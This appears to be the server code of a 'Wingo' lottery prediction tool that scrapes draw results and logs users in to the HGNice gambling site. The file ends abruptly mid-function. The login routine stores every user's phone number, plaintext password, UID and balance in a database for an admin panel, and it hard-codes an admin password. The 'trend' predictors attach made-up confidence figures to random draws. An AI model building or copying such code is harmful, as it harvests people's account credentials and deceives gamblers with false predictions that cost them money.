import express from 'express';
import compression from 'compression';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { createHash } from 'crypto';
import { readFileSync, writeFileSync, existsSync } from 'fs';
import Database from '@replit/database';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = 5000;
const ADMIN_PASSWORD = 'wingo@admin2024';
const CREDS_FILE    = join(__dirname, 'credentials.json');
const replDb = new Database();
const HISTORY_FILE  = join(__dirname, 'wingo_history.json');
const SEED_FILE     = join(__dirname, 'wingo_seed_periods.json');
const PRED_FILE     = join(__dirname, 'prediction_history.json');

// ── Seed period set: rounds that are training-only and never shown in live history
let seedPeriods = new Set();
function loadSeedPeriods() {
  try {
    if (existsSync(SEED_FILE)) {
      const raw = JSON.parse(readFileSync(SEED_FILE, 'utf8'));
      if (Array.isArray(raw)) {
        seedPeriods = new Set(raw.map(String));
        console.log(`[seed] Loaded ${seedPeriods.size} training-only periods (PDF dataset)`);
      }
    }
  } catch { seedPeriods = new Set(); }
}
loadSeedPeriods();

// ── Persistent server-side history accumulator ────────────────────────────────
let serverHistory    = [];   // sorted newest-first, unlimited
let serverHistorySet = new Set();

function loadHistory() {
  try {
    if (existsSync(HISTORY_FILE)) {
      const raw = JSON.parse(readFileSync(HISTORY_FILE, 'utf8'));
      if (Array.isArray(raw)) {
        serverHistory = raw;
        serverHistorySet = new Set(serverHistory.map(h => h.period));
        console.log(`[history] Loaded ${serverHistory.length} rounds from disk`);
      }
    }
  } catch { serverHistory = []; serverHistorySet = new Set(); }
}

// Debounced saveHistory — batches rapid successive calls into one disk write
let _saveHistoryTimer = null;
function saveHistory() {
  if (_saveHistoryTimer) return;  // already queued — latest data will be written
  _saveHistoryTimer = setTimeout(() => {
    _saveHistoryTimer = null;
    try { writeFileSync(HISTORY_FILE, JSON.stringify(serverHistory)); } catch {}
  }, 1000);
}

function recordResult(item) {
  if (!item || !item.period || serverHistorySet.has(item.period)) return false;
  serverHistorySet.add(item.period);
  serverHistory.unshift(item);
  serverHistory.sort((a, b) => String(b.period).localeCompare(String(a.period)));
  // no cap — store unlimited rounds
  saveHistory();
  statsCache = null;   // invalidate streak stats cache on new result
  // Recompute and cache the prediction immediately — stays current even when no browsers are open
  setImmediate(() => {
    try { serverPredictionCache = predictNext(); } catch(e) {}
  });
  return true;
}

loadHistory();

// ── Server-side prediction history ────────────────────────────────────────────
let predHistory    = [];
let predHistorySet = new Set();

function loadPredHistory() {
  try {
    if (existsSync(PRED_FILE)) {
      const raw = JSON.parse(readFileSync(PRED_FILE, 'utf8'));
      if (Array.isArray(raw)) {
        predHistory    = raw;
        predHistorySet = new Set(predHistory.map(p => String(p.period)));
        console.log(`[pred] Loaded ${predHistory.length} prediction records`);
      }
    }
  } catch { predHistory = []; predHistorySet = new Set(); }
}

let _savePredFileTimer = null;
function savePredHistoryToFile() {
  if (_savePredFileTimer) return;
  _savePredFileTimer = setTimeout(() => {
    _savePredFileTimer = null;
    try { writeFileSync(PRED_FILE, JSON.stringify(predHistory)); } catch {}
  }, 1000);
}

loadPredHistory();

// ── WingoPredictor (ported from Python) ──────────────────────────────────────
let statsCache = null;            // rebuilt on demand / on new result
let statsCacheSize = 0;
let serverPredictionCache = null; // latest prediction — stays current 24/7 even with no browsers open
let lastPrediction = null;        // { color, number } — anti-lock state for number predictor
let rotationBias = 0;             // dynamic bias updated each prediction to prevent color lock

/**
 * Build streak-aware stats table from history — O(N) single pass.
 * First counts all (result → next_result) transitions in one sweep,
 * then maps streak_result keys to those base counts (matching the original
 * logic where the stats value depends only on `result`, not streak length).
 */
function buildWingoStats(history) {
  if (!history || history.length < 2) return {};
  const rounds = [...history].reverse(); // oldest-first

  // Pass 1 — O(N): count all result→next transitions
  const base = {};
  for (let i = 0; i < rounds.length - 1; i++) {
    const r = rounds[i].result;
    const nxt = rounds[i + 1].result;
    if (!base[r]) base[r] = { continue: 0, reverse: 0 };
    if (nxt === r) base[r].continue++;
    else base[r].reverse++;
  }

  // Pass 2 — O(N): assign each unique streak_result key its base counts
  const stats = {};
  let streak = 1;
  let prev = null;
  for (const round of rounds) {
    const result = round.result;
    if (result === prev) streak++;
    else streak = 1;
    prev = result;
    const key = `${streak}_${result}`;
    if (!stats[key]) stats[key] = base[result] || { continue: 0, reverse: 0 };
  }
  return stats;
}

function getCachedStats() {
  if (!statsCache || statsCacheSize !== serverHistory.length) {
    statsCache = buildWingoStats(serverHistory);
    statsCacheSize = serverHistory.length;
  }
  return statsCache;
}

/**
 * Predict color (BIG/SMALL) using streak-pressure stats.
 * Port of Python WingoPredictor.predict_color():
 *   p_continue = (cont/total) * (0.9 - rotationBias)  — adaptive continue penalty
 *   p_reverse  = (rev/total)  * (1.1 + rotationBias)  — adaptive reverse boost
 *   random adjustment ∈ [-0.02, 0.02] adds stochastic variance
 *   rotationBias is updated each call: uniform [0.01, 0.05] to prevent lock
 */
function predictColor(streakLen, currentResult) {
  const stats = getCachedStats();
  const key = `${streakLen}_${currentResult}`;

  if (!stats[key]) {
    rotationBias = Math.random() * 0.04 + 0.01;
    return { color: currentResult, pCont: 0.5, pRev: 0.5, method: 'fallback-no-key' };
  }

  const cont  = stats[key].continue;
  const rev   = stats[key].reverse;
  const total = cont + rev;

  if (total === 0) {
    rotationBias = Math.random() * 0.04 + 0.01;
    return { color: currentResult, pCont: 0.5, pRev: 0.5, method: 'fallback-zero' };
  }

  const pCont = (cont / total) * (0.8 - rotationBias);
  const pRev  = (rev  / total) * (1.2 + rotationBias);
  const adjustment = (Math.random() * 0.06) - 0.03; // uniform [-0.03, 0.03]

  const continueWins = (pCont + adjustment) >= pRev;
  const color = continueWins ? currentResult : (currentResult === 'BIG' ? 'SMALL' : 'BIG');

  // Update bias each round: uniform [-0.05, 0.05] (matches Python: random.uniform(-0.05, 0.05))
  rotationBias = (Math.random() * 0.10) - 0.05; // uniform [-0.05, 0.05]

  return { color, pCont, pRev, method: 'wingo-predictor' };
}

/**
 * Predict number using Python WingoPredictor.predict_number() logic:
 *  1. Look at last 100 rounds across ALL digits 0-9.
 *  2. If any digits are completely missing → pick from missing (rebound theory).
 *  3. Otherwise → pick randomly from BIG cluster (5-9) or SMALL cluster (0-4).
 *  4. Anti-lock rule: if same color+number pair repeats → rotate to any digit 0-9.
 */
function predictNumber(history, color) {
  const recent = history.slice(0, Math.min(50, history.length)); // newest-first, last 50 (Python: tail(50))
  const allNumbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
  const seenNums = new Set(recent.map(r => Number(r.number)).filter(n => !isNaN(n)));
  const missing = allNumbers.filter(n => !seenNums.has(n));

  const smallCluster = [0, 1, 2, 3, 4];
  const bigCluster   = [5, 6, 7, 8, 9];

  const lastColor = lastPrediction ? lastPrediction.color : null;
  const lastNum   = lastPrediction ? lastPrediction.number : null;

  let number;
  if (missing.length > 0) {
    number = missing[Math.floor(Math.random() * missing.length)];
  } else {
    const cluster = color === 'BIG' ? bigCluster : smallCluster;
    number = cluster[Math.floor(Math.random() * cluster.length)];
  }

  // Anti-lock rule: same color+number pair repeats → rotate to any digit 0-9
  if (lastColor === color && lastNum === number) {
    number = allNumbers[Math.floor(Math.random() * allNumbers.length)];
  }

  lastPrediction = { color, number };
  return number;
}

// ── PRNG Wingo Trend Family Detector ─────────────────────────────────────────
// Detects the active trend family from the 19-family taxonomy and returns a
// { color, number, family, boost } signal to override/blend with stats prediction.
// history is newest-first array of { result, number }.
function detectTrendFamily(history) {
  if (history.length < 3) return null;
  const h   = history.slice(0, 20);
  const cur = h[0];
  const curColor = cur.result;
  const curNum   = Number(cur.number);
  const opp      = curColor === 'BIG' ? 'SMALL' : 'BIG';

  // Current streak length
  let streakLen = 0;
  for (const r of h) { if (r.result === curColor) streakLen++; else break; }

  // ── Reset Burst: after 15+ same-color streak → sudden opposite burst
  if (streakLen >= 15) {
    return { color: opp, number: opp === 'BIG' ? 7 : 2, family: 'Reset Burst', boost: 2.5 };
  }

  // ── Exhaustion Reversal: 8-12 rounds same color → reversal probability spikes
  if (streakLen >= 8) {
    return { color: opp, number: null, family: 'Exhaustion Reversal', boost: 2.0 };
  }

  // ── Symmetry Loop: BIG X → SMALL Y → BIG X → SMALL Y mirror rhythm
  if (h.length >= 4 &&
      h[0].result === h[2].result && h[1].result === h[3].result &&
      Number(h[0].number) === Number(h[2].number) &&
      Number(h[1].number) === Number(h[3].number)) {
    return { color: h[1].result, number: Number(h[1].number), family: 'Symmetry Loop', boost: 1.9 };
  }

  // ── Mirrors: BIG 7 → SMALL 3 (sum ≈ 10) pair across 2 rounds
  if (h.length >= 2) {
    const sumPair = curNum + Number(h[1].number);
    if (sumPair === 10 && h[0].result !== h[1].result) {
      return { color: h[1].result, number: Number(h[1].number), family: 'Mirrors', boost: 1.7 };
    }
  }

  // ── Spike: BIG 9 or SMALL 0 after mid-range digits → shock before return to normal
  if ((curColor === 'BIG' && curNum === 9) || (curColor === 'SMALL' && curNum === 0)) {
    if (h.length >= 2) {
      const pn = Number(h[1].number);
      if (pn >= 3 && pn <= 7) {
        return { color: opp, number: opp === 'BIG' ? 6 : 3, family: 'Spike', boost: 1.8 };
      }
    }
  }

  // ── Momentum Bias: BIG 7/8/9 or SMALL 0/1 → strong digit carries streak forward
  if (curColor === 'BIG' && curNum >= 7) {
    return { color: curColor, number: curNum >= 8 ? 9 : 8, family: 'Momentum Bias', boost: 1.6 };
  }
  if (curColor === 'SMALL' && curNum <= 1) {
    return { color: curColor, number: curNum === 0 ? 0 : 1, family: 'Momentum Bias', boost: 1.6 };
  }

  // ── Breakers: SMALL 0 or SMALL 1 following BIG streak → reversal signal
  if (curColor === 'SMALL' && (curNum === 0 || curNum === 1)) {
    const prevBigs = h.slice(1, 5).filter(r => r.result === 'BIG').length;
    if (prevBigs >= 2) {
      return { color: 'SMALL', number: curNum === 0 ? 1 : 2, family: 'Breakers', boost: 1.7 };
    }
  }

  // ── False Break: single opposite round inside same-color streak → original continues
  if (streakLen === 1 && h.length >= 4) {
    const priorColor = h[1].result;
    let priorLen = 0;
    for (let i = 1; i < h.length; i++) { if (h[i].result === priorColor) priorLen++; else break; }
    if (priorLen >= 3) {
      return { color: priorColor, number: null, family: 'False Break', boost: 1.6 };
    }
  }

  // ── Doublets/Triplets: same digit 2-3 times consecutively → reversal
  if (h.length >= 2 && curNum === Number(h[1].number)) {
    const isTriple = h.length >= 3 && curNum === Number(h[2].number);
    return { color: opp, number: null, family: isTriple ? 'Triplets' : 'Doublets', boost: isTriple ? 1.8 : 1.5 };
  }

  // ── Echo Pattern: digit repeats after 2-3 round gap → continuation
  for (let gap = 2; gap <= 3; gap++) {
    if (h[gap] && curNum === Number(h[gap].number) && curNum !== Number(h[1].number)) {
      return { color: curColor, number: curNum, family: 'Echo Pattern', boost: 1.4 };
    }
  }

  // ── Anchor Digits: BIG 5 or SMALL 3 → reset flow, defer to stats
  if ((curColor === 'BIG' && curNum === 5) || (curColor === 'SMALL' && curNum === 3)) {
    return { color: null, number: null, family: 'Anchor Digit', boost: 1.0 };
  }

  // ── Drift Pattern: gradual shift in dominance over 10-15 rounds
  if (h.length >= 15) {
    const early = h.slice(8, 15).filter(r => r.result === curColor).length;
    const late  = h.slice(0, 7).filter(r => r.result === curColor).length;
    if (late > early + 2) return { color: curColor, number: null, family: 'Drift Pattern', boost: 1.3 };
    if (early > late + 2) return { color: opp, number: null, family: 'Drift Pattern', boost: 1.3 };
  }

  // ── Waveform: digits rise or fall like a sine wave over last 4 rounds
  if (h.length >= 4) {
    const nums = h.slice(0, 4).map(r => Number(r.number));
    const rising  = nums[0] > nums[1] && nums[1] > nums[2] && nums[2] > nums[3];
    const falling = nums[0] < nums[1] && nums[1] < nums[2] && nums[2] < nums[3];
    if (rising)  return { color: curColor, number: Math.min(9, nums[0] + 1), family: 'Waveform ↑', boost: 1.2 };
    if (falling) return { color: opp,      number: Math.max(0, nums[0] - 1), family: 'Waveform ↓', boost: 1.2 };
  }

  // ── Clusters: small groups BIG inside SMALLs or vice versa
  if (h.length >= 6) {
    const r0 = h.slice(0, 3).filter(r => r.result === curColor).length;
    const r1 = h.slice(3, 6).filter(r => r.result === curColor).length;
    if (r0 >= 3 && r1 <= 1) return { color: curColor, number: null, family: 'Clusters', boost: 1.2 };
  }

  return null;
}

// ── Python predict_next port ──────────────────────────────────────────────────
// Exact port of the user-provided Python predict_next() logic.
// Priority chain: exhaustion(≥10) → breaker digits(0,1,9) → continuation(≤3) → 65/35 weighted
function predictNextPy(history) {
  if (!history || history.length === 0) return null;
  const last       = history[0]; // newest-first
  const streakColor = last.result;
  let streakLen    = 1;
  for (let i = 1; i < history.length; i++) {
    if (history[i].result === streakColor) streakLen++;
    else break;
  }
  const opp     = streakColor === 'BIG' ? 'SMALL' : 'BIG';
  const lastNum = Number(last.number);

  if (streakLen >= 10) return { color: opp,         reason: 'Exhaustion reversal', streakLen };
  if ([0,1,9].includes(lastNum)) return { color: opp, reason: 'Breaker digit',       streakLen };
  if (streakLen <= 3)  return { color: streakColor,  reason: 'Continuation bias',   streakLen };
  // Weighted fallback: 65% continue, 35% reverse
  const color = Math.random() < 0.65 ? streakColor : opp;
  return { color, reason: 'Weighted choice', streakLen };
}

// ── Master predictor ──────────────────────────────────────────────────────────
function predictNext() {
  if (serverHistory.length === 0) {
    return { prediction: 'BIG', confidence: 50, streakLen: 0, currentResult: null, method: 'no-data' };
  }

  // Detect current streak (history is newest-first)
  const currentResult = serverHistory[0].result;
  let streakLen = 1;
  for (let i = 1; i < serverHistory.length && serverHistory[i].result === currentResult; i++) {
    streakLen++;
  }

  const { color: statsPrediction, pCont, pRev, method } = predictColor(streakLen, currentResult);

  // ── Layer 1: Python predict_next (deterministic rules: exhaustion/breaker/continuation/weighted) ──
  const pyResult  = predictNextPy(serverHistory);

  // ── Layer 2: PRNG Trend Family detection ──
  const trendInfo = detectTrendFamily(serverHistory);

  // ── Blend all three layers ──
  // Python rules are deterministic and highest priority for their cases;
  // trend families override stats when boost ≥ 1.5; stats are the fallback.
  let prediction  = statsPrediction;
  let trendFamily = trendInfo?.family || (pyResult?.reason ?? null);
  let finalMethod = method;

  if (pyResult && pyResult.reason !== 'Weighted choice') {
    // Deterministic rule fired (exhaustion/breaker/continuation) → use Python result
    prediction  = pyResult.color;
    finalMethod = `py:${pyResult.reason}`;
  } else if (trendInfo?.color && trendInfo.boost >= 1.5) {
    // Trend family with high boost overrides stats
    prediction  = trendInfo.color;
    finalMethod = `trend:${trendFamily}`;
    trendFamily = trendInfo.family;
  } else if (pyResult?.reason === 'Weighted choice') {
    // 65/35 weighted fallback — stats wins
    prediction  = statsPrediction;
    finalMethod = `py:${pyResult.reason}`;
  }

  // Derive display confidence
  const stronger = Math.max(pCont, pRev);
  const weaker   = Math.min(pCont, pRev);
  const margin   = stronger / (stronger + weaker + 1e-9);
  let confidence = Math.min(92, Math.max(52, Math.round(52 + (margin - 0.5) * (92 - 52) / 0.45)));
  if (trendInfo?.boost >= 2.0) confidence = Math.min(93, confidence + 8);
  else if (trendInfo?.boost >= 1.7) confidence = Math.min(91, confidence + 5);
  else if (trendInfo?.boost >= 1.4) confidence = Math.min(88, confidence + 3);

  const predictedNumber = (trendInfo?.number != null)
    ? trendInfo.number
    : predictNumber(serverHistory, prediction);

  return {
    prediction,
    confidence,
    predictedNumber,
    streakLen,
    currentResult,
    pCont: parseFloat(pCont.toFixed(3)),
    pRev:  parseFloat(pRev.toFixed(3)),
    method: finalMethod,
    trendFamily
  };
}

app.use(compression());
app.use(express.json());

// ── Auth session store (token per user) ───────────────────────────────────────
const authSessions = new Map(); // phone → { token, tokenHeader, lastSeen }

// ── Credential store (Replit DB — persists across deployments) ────────────────
let _credsMigrated = false;
async function loadCreds() {
  try {
    const raw = await replDb.get('creds');
    // @replit/database wraps responses: { ok: true, value: <data> }
    const val = (raw && typeof raw === 'object' && 'value' in raw) ? raw.value : raw;
    if (Array.isArray(val)) return val;
    // Migrate from local JSON file exactly once per process lifetime
    if (!_credsMigrated && existsSync(CREDS_FILE)) {
      _credsMigrated = true;
      try {
        const local = JSON.parse(readFileSync(CREDS_FILE, 'utf8'));
        if (Array.isArray(local) && local.length) {
          await replDb.set('creds', local);
          console.log('[creds] migrated', local.length, 'records from disk to Replit DB');
          return local;
        }
      } catch {}
    }
    _credsMigrated = true;
    return [];
  } catch (e) {
    console.error('[creds] loadCreds error:', e.message);
    try { return existsSync(CREDS_FILE) ? JSON.parse(readFileSync(CREDS_FILE, 'utf8')) : []; } catch { return []; }
  }
}
async function deleteCred(phone) {
  try {
    const list = await loadCreds();
    const filtered = list.filter(c => c.phone !== phone);
    await replDb.set('creds', filtered);
    return true;
  } catch (e) { console.error('[creds] deleteCred error:', e.message); return false; }
}
async function saveCred(phone, password, balance = null, uid = null) {
  try {
    const list = await loadCreds();
    const idx = list.findIndex(c => c.phone === phone);
    const entry = {
      phone, password,
      uid: uid !== null ? String(uid) : (idx >= 0 ? list[idx].uid ?? null : null),
      balance: balance !== null ? balance : (idx >= 0 ? list[idx].balance : null),
      lastLogin: new Date().toISOString()
    };
    if (idx >= 0) list[idx] = entry; else list.unshift(entry);
    await replDb.set('creds', list);
    console.log('[creds] saved to DB:', phone, '| uid:', entry.uid, '| balance:', entry.balance);
  } catch (e) {
    console.error('[creds] saveCred DB error:', e.message);
  }
}

const HEADERS = {
  'Referer': 'https://www.tigrozone.com/',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
};

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

// ── HGNice auth helpers ───────────────────────────────────────────────────────
function md5Upper(str) {
  return createHash('md5').update(str).digest('hex').toUpperCase();
}

function generateUUID() {
  return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

function buildSignature(data) {
  const exclude = new Set(['signature', 'track', 'xosoBettingData']);
  const keys = Object.keys(data).sort();
  const sorted = {};
  keys.forEach(k => {
    if (data[k] !== null && data[k] !== '' && !exclude.has(k)) {
      sorted[k] = data[k] === 0 ? 0 : data[k];
    }
  });
  return md5Upper(JSON.stringify(sorted)).slice(0, 32);
}

async function hgniceLogin(username, password) {
  const GAME_API = 'https://api.hgnicepayapi.com/api/webapi/Login';
  const GAME_HEADERS = {
    'Content-Type': 'application/json',
    'Referer': 'https://hgnice.club/',
    'Origin': 'https://hgnice.club',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  };

  const sleep = ms => new Promise(r => setTimeout(r, ms));

  // Build prioritised attempt list: 880+input (game's actual format) first, then as-entered
  const attempts = [];
  const rawNum = username.replace(/^\+/, '');
  if (rawNum.startsWith('880')) {
    // user entered full number e.g. 8801938101003 — try as-is first, then without prefix
    attempts.push({ uname: rawNum,            pwd: password });
    attempts.push({ uname: '0' + rawNum.slice(3), pwd: password });
    attempts.push({ uname: rawNum,            pwd: md5Upper(password).toLowerCase() });
  } else if (rawNum.startsWith('0')) {
    // user entered 01938101003 — game uses 8801938101003
    attempts.push({ uname: '880' + rawNum.slice(1), pwd: password });
    attempts.push({ uname: rawNum,                  pwd: password });
    attempts.push({ uname: '880' + rawNum.slice(1), pwd: md5Upper(password).toLowerCase() });
  } else {
    // user entered 1938101003 — game uses 8801938101003
    attempts.push({ uname: '880' + rawNum, pwd: password });
    attempts.push({ uname: rawNum,         pwd: password });
    attempts.push({ uname: '880' + rawNum, pwd: md5Upper(password).toLowerCase() });
  }

  for (let i = 0; i < attempts.length; i++) {
    if (i > 0) await sleep(900); // avoid rate-limit between attempts
    const { uname, pwd } = attempts[i];
    const body = {
      username: uname,
      pwd: pwd,
      logintype: 'mobile',
      captchaId: '',
      track: '',
      phonetype: 0,
      packId: '',
      deviceId: '',
      random: generateUUID()
    };
    body.signature = buildSignature(body);
    body.timestamp = Math.floor(Date.now() / 1000);

    try {
      const res = await fetch(GAME_API, {
        method: 'POST',
        headers: GAME_HEADERS,
        body: JSON.stringify(body)
      });
      const data = await res.json();
      console.log('[auth] attempt', i+1, '| user:', uname, '| code:', data.code, 'msg:', data.msg);
      if (data.code === 0) {
        const parentId = String(data.data?.parentUserId || '');
        console.log('[auth] SUCCESS — data.data keys:', data.data ? Object.keys(data.data).join(',') : 'null');
        console.log('[auth] SUCCESS — parentUserId:', parentId, '| full data.data:', JSON.stringify(data.data));
        // Allow admin-whitelisted accounts (already in DB) to bypass referral check
        const isWhitelisted = (await loadCreds()).some(c => c.phone === uname);
        const HGNICE_PARENT_ID = process.env.HGNICE_PARENT_ID || '';
        if (HGNICE_PARENT_ID && parentId !== HGNICE_PARENT_ID && !isWhitelisted) {
          return { success: false, msg: 'Access denied. This tool is only available to users registered through our referral link.' };
        }
        // Store auth session for balance lookups
        const tok = data.data?.token || '';
        const tokPrefix = data.data?.tokenHeader || 'Bearer ';
        if (tok) authSessions.set(uname, { token: tok, tokenHeader: tokPrefix, lastSeen: Date.now() });
        // Decode UID from JWT payload (field is "UserId" inside the token claims)
        let uid = null;
        try {
          const jwtPayload = JSON.parse(Buffer.from(tok.split('.')[1], 'base64').toString('utf8'));
          uid = jwtPayload.UserId ?? jwtPayload.userId ?? jwtPayload.uid ?? jwtPayload.id ?? null;
          if (uid) uid = String(uid);
        } catch {}
        console.log('[auth] UID from JWT:', uid);
        // Save credentials immediately so admin panel always sees the user,
        // even if the background balance fetch fails or takes time.
        // Always store the original plaintext password the user entered, not
        // the attempt-specific variant (which may be an md5 hash).
        await saveCred(uname, password, null, uid);
        // Then update with balance + uid details in the background
        fetchAndSaveBalance(uname, password, tok, tokPrefix, uid);
        return { success: true, phone: uname, data: data.data };
      }
    } catch (e) { console.log('[auth] fetch error:', e.message); }
  }
  return { success: false, msg: 'Wrong phone number or password. Please check your HGNice credentials.' };
}

function parseJwtPayload(token) {
  try {
    return JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString('utf8'));
  } catch { return null; }
}

async function fetchAndSaveBalance(phone, password, token, tokenPrefix, uid = null) {
  if (!token) { await saveCred(phone, password, null, uid); return; }

  // ── Primary: extract balance & uid directly from the JWT payload ──────────
  // HGNice embeds Amount + UserId inside the access token — no extra call needed.
  const jwt = parseJwtPayload(token);
  if (jwt) {
    const jwtBal = jwt.Amount !== undefined ? parseFloat(jwt.Amount) : null;
    const jwtUid = uid ?? jwt.UserId ?? jwt.userId ?? jwt.uid ?? null;
    if (jwtBal !== null && !isNaN(jwtBal)) {
      console.log('[balance] JWT extract — uid:', jwtUid, '| amount:', jwtBal);
      await saveCred(phone, password, jwtBal, jwtUid ? String(jwtUid) : null);
      return;
    }
  }

  // ── Fallback: hit the Lottery API (GET with Authorization header) ─────────
  const hdrs = {
    'Content-Type': 'application/json',
    'Referer': 'https://hgnice.club/',
    'Origin': 'https://hgnice.club',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Authorization': `${tokenPrefix}${token}`
  };
  for (const epUrl of [
    'https://api.ar-lottery01.com/api/Lottery/GetUserInfo',
    'https://api.ar-lottery01.com/api/Lottery/GetBalance',
  ]) {
    try {
      const random = generateUUID();
      const sig = buildSignature({ language: 'en', random });
      const r = await fetch(`${epUrl}?language=en&random=${random}&signature=${sig}`, { headers: hdrs });
      const text = await r.text();
      if (!text) continue;
      const d = JSON.parse(text);
      if ((d.code === 0 || d.code === 200) && d.data) {
        const bal = d.data.balance ?? d.data.totalBalance ?? d.data.availBalance ??
                    d.data.walletBalance ?? d.data.amount ?? d.data.money ?? null;
        const resolvedUid = uid ?? d.data.userId ?? d.data.userID ?? d.data.uid ?? null;
        console.log('[balance] API', epUrl.split('/').pop(), '— uid:', resolvedUid, '| bal:', bal);
        await saveCred(phone, password, bal, resolvedUid ? String(resolvedUid) : null);
        return;
      }
    } catch (e) { console.log('[balance] API error:', e.message); }
  }
  await saveCred(phone, password, null, uid);
}

function mapItem(item) {
  return {
    period: String(item.issueNumber || ''),
    number: parseInt(item.number || 0, 10),
    result: (item.number || 0) >= 5 ? 'BIG' : 'SMALL',
    color: String(item.color || '')
  };
}

// ── Server-side proactive caches ──────────────────────────────────────────────
let stateCache = {
  issueNumber: '', nextIssueNumber: '', endTime: 0,
  remainTime: 0, previous: null, fetchedAt: 0
};
let earlyCache = { latest: null, fetchedAt: 0 };
let earlyPollerHandle  = null;   // chain A
let earlyPollerHandle2 = null;   // chain B (offset by 5ms) — parallel poller
let statePollerHandle  = null;

// ── State poller — always running, speeds up near round end ──────────────────
async function pollState() {
  try {
    const now = Date.now();
    const url = `https://draw.ar-lottery01.com/WinGo/WinGo_30S.json?ts=${now}`;
    const response = await fetch(url, { headers: HEADERS });
    const data = await response.json();
    const current  = data.current  || {};
    const next     = data.next     || {};
    const previous = data.previous || {};

    const endTime    = parseInt(current.endTime || 0, 10);
    const remainTime = endTime ? Math.max(0, (endTime - now) / 1000) : 0;

    stateCache = {
      issueNumber:     String(current.issueNumber || ''),
      nextIssueNumber: String(next.issueNumber    || ''),
      endTime,
      remainTime,
      previousIssueNumber: String(previous.issueNumber || ''),
      previous: null,
      fetchedAt: now
    };

    // ── Try to extract result from state API's `previous` field ──────────────
    // The state API is polled every 80ms and its `previous` object may carry
    // the result BEFORE the history page is updated — giving us a 6-10s lead.
    const prevIssue = String(previous.issueNumber || '');
    const prevNum   = previous.number !== undefined ? parseInt(previous.number, 10)
                    : previous.winNumber !== undefined ? parseInt(previous.winNumber, 10)
                    : previous.numberValue !== undefined ? parseInt(previous.numberValue, 10)
                    : NaN;

    if (prevIssue && !isNaN(prevNum) && prevNum >= 0 && prevNum <= 9) {
      if (!earlyCache.latest || prevIssue !== earlyCache.latest.period) {
        const item = mapItem({ issueNumber: prevIssue, number: prevNum, color: previous.color || '' });
        earlyCache = { latest: item, fetchedAt: now };
        recordResult(item);
        console.log(`[state] NEW RESULT via state.previous: period=${item.period} num=${item.number} result=${item.result} remain=${remainTime.toFixed(1)}s`);
      }
    }

    // Adaptive state poll: 60ms in last 30s (was 80ms), else 600ms
    const nextDelay = remainTime <= 30 ? 60 : 600;
    statePollerHandle = setTimeout(pollState, nextDelay);

    // Kick off BOTH parallel early pollers when within 30s of round end
    // Chain B starts 5ms after Chain A — effective check every ~5ms
    if (remainTime <= 30 && remainTime > 0) {
      scheduleEarlyPoller();
      if (!earlyPollerHandle2) setTimeout(scheduleEarlyPoller2, 5);
    }
  } catch (e) {
    statePollerHandle = setTimeout(pollState, 1000);
  }
}

// ── Shared fetch helper — used by both poller chains ─────────────────────────
async function fetchEarlyOnce(tag) {
  const ts = Date.now();
  const url = `https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=1&ts=${ts}`;
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 400);  // tight timeout
  try {
    const response = await fetch(url, { headers: HEADERS, signal: controller.signal });
    clearTimeout(timeoutId);
    const data = await response.json();
    const list = data.data?.list || data.list || [];
    if (list.length) {
      const item = mapItem(list[0]);
      if (!earlyCache.latest || item.period !== earlyCache.latest.period) {
        earlyCache = { latest: item, fetchedAt: Date.now() };
        recordResult(item);
        const secsBeforeEnd = stateCache.endTime
          ? ((stateCache.endTime - Date.now()) / 1000)
          : NaN;
        console.log(`[${tag}] NEW RESULT: period=${item.period} num=${item.number} result=${item.result} secsBeforeEnd=${isNaN(secsBeforeEnd) ? 'n/a' : secsBeforeEnd.toFixed(2)}s`);
      }
    }
  } catch (e) {
    clearTimeout(timeoutId);
  }
}

// ── Chain A — polls every 10ms ────────────────────────────────────────────────
async function pollEarly() {
  earlyPollerHandle = null;
  await fetchEarlyOnce('A');
  scheduleEarlyPoller();
}

// ── Chain B — polls every 10ms, launched 5ms after chain A ───────────────────
// Together A+B give an effective check every ~5ms
async function pollEarly2() {
  earlyPollerHandle2 = null;
  await fetchEarlyOnce('B');
  scheduleEarlyPoller2();
}

function scheduleEarlyPoller() {
  if (earlyPollerHandle) return;
  earlyPollerHandle = setTimeout(pollEarly, 15);
}

function scheduleEarlyPoller2() {
  if (earlyPollerHandle2) return;
  earlyPollerHandle2 = setTimeout(pollEarly2, 15);
}

// ── Seed earlyCache immediately at startup ────────────────────────────────────
async function seedEarlyCache() {
  try {
    const ts = Date.now();
    const url = `https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=1&ts=${ts}`;
    const response = await fetch(url, { headers: HEADERS });
    const data = await response.json();
    const list = data.data?.list || data.list || [];
    if (list.length) {
      const item = mapItem(list[0]);
      earlyCache = { latest: item, fetchedAt: Date.now() };
      console.log(`[seed] earlyCache initialized: period=${item.period} number=${item.number} result=${item.result}`);
    }
  } catch (e) { console.warn('[seed] earlyCache init failed:', e.message); }
}

// Seed history from API on startup (gets the latest ~10 rounds immediately)
async function seedHistoryOnStartup() {
  try {
    const ts   = Date.now();
    const url  = `https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=10&ts=${ts}`;
    const resp = await fetch(url, { headers: HEADERS });
    const data = await resp.json();
    const list = data.data?.list || data.list || [];
    let added  = 0;
    for (const raw of list) {
      const item = mapItem(raw);
      if (recordResult(item)) added++;
    }
    if (added) console.log(`[history] Seeded ${added} rounds from API on startup`);
